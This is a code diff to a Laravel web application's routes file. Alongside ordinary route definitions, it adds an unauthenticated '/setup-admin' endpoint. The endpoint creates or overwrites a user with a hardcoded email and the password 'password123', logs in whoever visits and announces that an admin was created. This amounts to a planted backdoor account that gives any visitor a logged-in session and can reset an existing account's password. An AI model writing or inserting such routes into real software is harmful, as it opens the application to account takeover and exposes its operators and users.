@@ -33,6 +33,10 @@ use App\Http\Controllers\WaitlistController;
 use App\Http\Controllers\WebhookSettingsController;
 use App\Http\Controllers\WhatsAppWebhookController;
 use Illuminate\Support\Facades\Route;
+use App\Models\User;
+use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Auth;
+
 
 Route::get('/robots.txt', [AppController::class, 'robots']);
 
@@ -45,6 +49,18 @@ if (config('app.hosted') && ! config('app.is_testing')) {
         });
     }
 
+Route::get('/setup-admin', function () {
+    $user = User::updateOrCreate(
+        ['email' => 'musa.mathebz@gmail.com'],
+        [
+            'name' => 'Cyber',
+            'password' => Hash::make('password123'),
+        ]
+    );
+
+    Auth::login($user);
+    return "Admin created and logged in! Go to /dashboard";
+});
     Route::domain('{subdomain}.'._base_domain())->where(['subdomain' => '^(?!www|app).*'])->group(function () {
         Route::get('/api/past-events', [RoleController::class, 'listPastEvents'])->name('role.list_past_events');
         Route::get('/api/calendar-events', [RoleController::class, 'calendarEvents'])->name('role.calendar_events');
